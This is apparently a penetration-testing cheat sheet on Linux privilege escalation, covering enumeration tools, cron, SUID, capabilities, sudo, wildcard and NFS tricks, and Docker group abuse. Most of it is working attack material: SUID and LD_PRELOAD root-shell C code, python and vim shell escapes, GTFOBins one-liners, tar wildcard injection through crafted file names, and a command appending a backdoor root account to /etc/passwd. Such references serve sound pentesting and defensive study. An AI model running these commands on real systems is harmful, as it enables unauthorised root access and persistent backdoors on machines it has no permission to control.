# Linux - Privilege Escalation

## Tools

- [LinEnum - Scripted Local Linux Enumeration & Privilege Escalation Checks](https://github.com/rebootuser/LinEnum)
    ```powershell
    ./LinEnum.sh -s -k keyword -r report -e /tmp/ -t
    ```
- [BeRoot - Privilege Escalation Project - Windows / Linux / Mac](https://github.com/AlessandroZ/BeRoot)
- [linuxprivchecker.py - a Linux Privilege Escalation Check Script](https://gist.github.com/sh1n0b1/e2e1a5f63fbec3706123)
- [unix-privesc-check - Automatically exported from code.google.com/p/unix-privesc-check](https://github.com/pentestmonkey/unix-privesc-check)

## Summary

* [Checklist](#checklist)
* [Cron job](#cron-job)
* [SUID](#suid)
    * [Find SUID binaries](#find-suid-binaries)
    * [Create a SUID binary](#create-a-suid-binary)
* [Capabilities](#capabilities)
    * [List capabilities of binaries](#list-capabilities-of-binaries)
    * [Edit capabilities](#edit-capabilities)
    * [Interesting capabilities](#interesting-capabilities)
* [SUDO](#sudo)
    * [NOPASSWD](#nopasswd)
    * [LD_PRELOAD and NOPASSWD](#ld-preload-and-passwd)
    * [Doas](#doas)
* [GTFOBins](#gtfobins)
* [Wildcard](#wildcard)
* [Groups](#groups)
    * [Docker](#docker)

## Checklists

* Kernel and distribution release details
* System Information:
  * Hostname
  * Networking details:
  * Current IP
  * Default route details
  * DNS server information
* User Information:
  * Current user details
  * Last logged on users
  * Shows users logged onto the host
  * List all users including uid/gid information
  * List root accounts
  * Extracts password policies and hash storage method information
  * Checks umask value
  * Checks if password hashes are stored in /etc/passwd
  * Extract full details for ‘default’ uid’s such as 0, 1000, 1001 etc
  * Attempt to read restricted files i.e. /etc/shadow
  * List current users history files (i.e .bash_history, .nano_history etc.)
  * Basic SSH checks
* Privileged access:
  * Which users have recently used sudo
  * Determine if /etc/sudoers is accessible
  * Determine if the current user has Sudo access without a password
  * Are known ‘good’ breakout binaries available via Sudo (i.e. nmap, vim etc.)
  * Is root’s home directory accessible
  * List permissions for /home/
* Environmental:
  * Display current $PATH
  * Displays env information
* Jobs/Tasks:
  * List all cron jobs
  * Locate all world-writable cron jobs
  * Locate cron jobs owned by other users of the system
  * List the active and inactive systemd timers
* Services:
  * List network connections (TCP & UDP)
  * List running processes
  * Lookup and list process binaries and associated permissions
  * List inetd.conf/xined.conf contents and associated binary file permissions
  * List init.d binary permissions
* Version Information (of the following):
  * Sudo
  * MYSQL
  * Postgres
  * Apache
    * Checks user config
    * Shows enabled modules
    * Checks for htpasswd files
    * View www directories
* Default/Weak Credentials:
  * Checks for default/weak Postgres accounts
  * Checks for default/weak MYSQL accounts
* Searches:
  * Locate all SUID/GUID files
  * Locate all world-writable SUID/GUID files
  * Locate all SUID/GUID files owned by root
  * Locate ‘interesting’ SUID/GUID files (i.e. nmap, vim etc)
  * Locate files with POSIX capabilities
  * List all world-writable files
  * Find/list all accessible *.plan files and display contents
  * Find/list all accessible *.rhosts files and display contents
  * Show NFS server details
  * Locate *.conf and *.log files containing keyword supplied at script runtime
  * List all *.conf files located in /etc
  * Locate mail
* Platform/software specific tests:
  * Checks to determine if we're in a Docker container
  * Checks to see if the host has Docker installed
  * Checks to determine if we're in an LXC container

## Cron job

Check if you have access with write permission on these files.   
Check inside the file, to find other paths with write permissions.   

```powershell
/etc/init.d
/etc/cron.d 
/etc/cron.daily
/etc/cron.hourly
/etc/cron.monthly
/etc/cron.weekly
/etc/sudoers
/etc/exports
/etc/at.allow
/etc/at.deny
/etc/crontab
/etc/cron.allow
/etc/cron.deny
/etc/anacrontab
/var/spool/cron/crontabs/root
```

## SUID

SUID/Setuid stands for "set user ID upon execution", it is enabled by default in every Linux distributions. If a file with this bit is ran, the uid will be changed by the owner one. If the file owner is `root`, the uid will be changed to `root` even if it was executed from user `bob`. SUID bit is represented by an `s`.

```powershell
╭─swissky@lab ~  
╰─$ ls /usr/bin/sudo -alh                  
-rwsr-xr-x 1 root root 138K 23 nov.  16:04 /usr/bin/sudo
```

### Find SUID binaries

```bash
find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
```

### Create a SUID binary

```bash
print 'int main(void){\nsetresuid(0, 0, 0);\nsystem("/bin/sh");\n}' > /tmp/suid.c   
gcc -o /tmp/suid /tmp/suid.c  
sudo chmod +x /tmp/suid # execute right
sudo chmod +s /tmp/suid # setuid bit
```


## Capabilities

### List capabilities of binaries 

```bash
╭─swissky@crashmanjaro ~  
╰─$ /usr/bin/getcap -r  /usr/bin
/usr/bin/fping                = cap_net_raw+ep
/usr/bin/dumpcap              = cap_dac_override,cap_net_admin,cap_net_raw+eip
/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
/usr/bin/rlogin               = cap_net_bind_service+ep
/usr/bin/ping                 = cap_net_raw+ep
/usr/bin/rsh                  = cap_net_bind_service+ep
/usr/bin/rcp                  = cap_net_bind_service+ep
```

### Edit capabilities

```powershell
/usr/bin/setcap -r /bin/ping            # remove
/usr/bin/setcap cap_net_raw+p /bin/ping # add
```

### Interesting capabilities

```powershell
cap_dac_read_search # read anything
cap_setuid+ep # setuid
```

Example of privilege escalation with `cap_setuid+ep`

```powershell
$ sudo /usr/bin/setcap cap_setuid+ep /usr/bin/python2.7

$ python2.7 -c 'import os; os.setuid(0); os.system("/bin/sh")'
sh-5.0# id
uid=0(root) gid=1000(swissky)
```


## SUDO

### NOPASSWD

Sudo configuration might allow a user to execute some command with another user privileges without knowing the password.

```bash
$ sudo -l

User demo may run the following commands on crashlab:
    (root) NOPASSWD: /usr/bin/vim
```

In this example the user `demo` can run `vim` as `root`, it is now trivial to get a shell by adding an ssh key into the root directory or by calling `sh`.

```bash
sudo vim -c '!sh'
sudo -u root vim -c '!sh'
```

### LD_PRELOAD and NOPASSWD

If `LD_PRELOAD` is explicitly defined in the sudoers file

```powershell
Defaults        env_keep += LD_PRELOAD
```

Compile the following C code with `gcc -fPIC -shared -o shell.so shell.c -nostartfiles`

```powershell
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
	unsetenv("LD_PRELOAD");
	setgid(0);
	setuid(0);
	system("/bin/sh");
}
```

Execute any binary with the LD_PRELOAD to spawn a shell : `sudo LD_PRELOAD=/tmp/shell.so find`

### Doas

There are some alternatives to the `sudo` binary such as `doas` for OpenBSD, remember to check its configuration at `/etc/doas.conf`

```bash
permit nopass demo as root cmd vim
```

## GTFOBins

[GTFOBins](https://gtfobins.github.io) is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions.

The project collects legitimate functions of Unix binaries that can be abused to break out restricted shells, escalate or maintain elevated privileges, transfer files, spawn bind and reverse shells, and facilitate the other post-exploitation tasks.

> gdb -nx -ex '!sh' -ex quit    
> sudo mysql -e '\! /bin/sh'    
> strace -o /dev/null /bin/sh 
> sudo awk 'BEGIN {system("/bin/sh")}'


## Wildcard

By using tar with –checkpoint-action options, a specified action can be used after a checkpoint. This action could be a malicious shell script that could be used for executing arbitrary commands under the user who starts tar. “Tricking” root to use the specific options is quite easy, and that’s where the wildcard comes in handy.

```powershell
# create file for exploitation
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh shell.sh"
echo "#\!/bin/bash\ncat /etc/passwd > /tmp/flag\nchmod 777 /tmp/flag" > shell.sh

# vulnerable script
tar cf archive.tar *
```

Tool: [wildpwn](https://github.com/localh0t/wildpwn)


## NFS Root Squashing

When **no_root_squash** appears in `/etc/exports`, the folder is shareable and a remote user can mount it

```powershell
# create dir
mkdir /tmp/nfsdir  

# mount directory 
mount -t nfs 10.10.10.10:/shared /tmp/nfsdir 
cd /tmp/nfsdir

# copy wanted shell 
cp /bin/bash . 	

# set suid permission
chmod +s bash 	
```


## Groups

### Docker

Mount the filesystem in a bash container, allowing you to edit the `/etc/passwd` as root, then add a backdoor account `toor:password`.

```bash
$> docker run -it --rm -v $PWD:/mnt bash
$> echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /mnt/etc/passwd
```

Or use the following docker image from [chrisfosterelli](https://hub.docker.com/r/chrisfosterelli/rootplease/) to spawn a root shell

```powershell
$ docker run -v /:/hostOS -i -t chrisfosterelli/rootplease
latest: Pulling from chrisfosterelli/rootplease
2de59b831a23: Pull complete 
354c3661655e: Pull complete 
91930878a2d7: Pull complete 
a3ed95caeb02: Pull complete 
489b110c54dc: Pull complete 
Digest: sha256:07f8453356eb965731dd400e056504084f25705921df25e78b68ce3908ce52c0
Status: Downloaded newer image for chrisfosterelli/rootplease:latest

You should now have a root shell on the host OS
Press Ctrl-D to exit the docker instance / shell

sh-5.0# id
uid=0(root) gid=0(root) groups=0(root)
```



## References

- [SUID vs Capabilities - Dec 7, 2017 - Nick Void aka mn3m](https://mn3m.info/posts/suid-vs-capabilities/)
- [Privilege escalation via Docker - April 22, 2015 — Chris Foster](https://fosterelli.co/privilege-escalation-via-docker.html)
- [An Interesting Privilege Escalation vector (getcap/setcap) - NXNJZ AUGUST 21, 2018](https://nxnjz.net/2018/08/an-interesting-privilege-escalation-vector-getcap/)
- [Exploiting wildcards on Linux - Berislav Kucan](https://www.helpnetsecurity.com/2014/06/27/exploiting-wildcards-on-linux/)
- [Code Execution With Tar Command - p4pentest](http://p4pentest.in/2016/10/19/code-execution-with-tar-command/)
- [Back To The Future: Unix Wildcards Gone Wild - Leon Juranic](http://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt)
- [HOW TO EXPLOIT WEAK NFS PERMISSIONS THROUGH PRIVILEGE ESCALATION? - APRIL 25, 2018](https://www.securitynewspaper.com/2018/04/25/use-weak-nfs-permissions-escalate-linux-privileges/)